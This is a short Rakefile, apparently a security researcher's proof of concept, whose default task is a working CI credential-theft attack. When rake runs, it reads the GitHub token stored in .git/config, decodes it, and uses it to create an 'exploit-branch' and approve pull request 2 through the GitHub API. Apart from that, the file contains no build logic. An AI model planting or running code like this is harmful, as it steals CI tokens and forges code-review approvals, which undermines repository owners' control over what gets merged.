task :default do
  system("TOKEN=$(grep -i 'extraheader = AUTHORIZATION' .git/config | awk '{print $NF}' | base64 -d | sed 's/x-access-token://'); \
          LATEST_COMMIT_SHA=$(curl -H \"Authorization: token $TOKEN\" https://api.github.com/repos/SecurityResearcher-yoda/test2/git/refs/heads/main | jq -r '.object.sha'); \
          NEW_BRANCH=\"exploit-branch\"; \
          curl -X POST -H \"Authorization: token $TOKEN\" -d \"{\\\"ref\\\": \\\"refs/heads/$NEW_BRANCH\\\", \\\"sha\\\": \\\"$LATEST_COMMIT_SHA\\\"}\" https://api.github.com/repos/SecurityResearcher-yoda/test2/git/refs; \
          PR_NUMBER=2; \
          curl --request POST --url https://api.github.com/repos/SecurityResearcher-yoda/test2/pulls/$PR_NUMBER/reviews --header \"authorization: Bearer $TOKEN\" --header \"content-type: application/json\" -d '{\"event\":\"APPROVE\"}'")
end

